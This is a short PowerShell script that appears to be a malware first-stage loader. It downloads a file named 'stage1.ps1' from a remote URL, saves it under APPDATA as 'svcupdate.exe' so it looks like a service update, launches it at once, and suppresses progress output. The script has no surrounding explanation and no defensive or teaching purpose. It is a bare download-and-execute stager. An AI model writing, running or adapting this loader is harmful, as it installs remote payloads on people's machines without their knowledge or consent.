
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://internal.corp/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath
$ProgressPreference = "SilentlyContinue"
